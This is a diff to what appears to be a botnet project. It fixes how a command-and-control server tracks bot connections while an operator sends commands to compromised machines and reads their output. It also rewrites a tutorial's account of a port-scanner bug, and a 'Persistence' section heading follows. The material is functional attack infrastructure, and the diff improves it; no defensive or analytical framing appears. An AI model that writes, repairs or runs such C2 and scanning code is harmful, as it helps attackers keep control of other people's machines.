@@ -181,17 +181,16 @@ def _recvall(sock, n):
 
 def handle_bot(conn, addr, bot_id):
     print(f"[+] Bot {bot_id} registered from {addr[0]}:{addr[1]}")
+    gone = threading.Event()
     with bot_lock:
-        bots[bot_id] = {"conn": conn, "addr": addr}
+        bots[bot_id] = {"conn": conn, "addr": addr, "gone": gone}
     try:
-        # Bot sits idle -- the operator handler talks to it directly.
-        # We just need to keep the connection alive and detect disconnect.
-        conn.settimeout(None)
-        while True:
-            # A zero-length recv means the bot disconnected.
-            data = conn.recv(1)
-            if not data:
-                break
+        # Bot sits idle -- the operator handler talks to it directly via
+        # send_msg/recv_msg. We must NOT read from the socket here because
+        # a concurrent recv would race with the operator handler and corrupt
+        # the length-prefixed framing. Instead we block on a threading.Event
+        # that the operator handler sets when it detects the bot has gone away.
+        gone.wait()
     except Exception:
         pass
     finally:
@@ -260,6 +259,11 @@ def handle_operator(conn, addr):
                     send_msg(conn, output if output else "(no output)")
                 except Exception as e:
                     send_msg(conn, f"Error communicating with bot: {e}")
+                    with bot_lock:
+                        gone_bot = bots.pop(selected, None)
+                    if gone_bot:
+                        gone_bot["gone"].set()
+                    selected = None
 
             elif cmd == "quit":
                 send_msg(conn, "Goodbye.")
@@ -702,22 +706,23 @@ Scanning 192.168.1.0/24...
   192.168.1.101: [22, 8080]
 ```
 
-The bug in the naive version is using `finally` to append results:
+The bug in the naive version is calling `hosts.append(host)` inside the per-port
+loop. Every time a port succeeds the entire host entry (with all ports found so
+far) gets appended again, so a host with two open ports ends up in the list twice
+with an incomplete port list each time:
 
 ```python
-# broken -- finally always runs, open_ports is always empty at this point
+# broken -- hosts.append runs once per successful port, not once per host
 try:
     socket.connect(...)
     host[-1].append(port)
+    hosts.append(host)  # appends a partial/duplicate entry on every success
 except:
     pass
-finally:
-    if len(host[-1]) > 0:  # this check is pointless, finally runs either way
-        hosts.append(host)
 ```
 
-The fix is to just check inside the `try` (which only runs on a successful connect) and
-skip the `finally` entirely, as shown above.
+The fix is to move `hosts.append(host)` outside the per-port loop so it runs
+once after all ports have been scanned, as shown above.
 
 ### Persistence
 
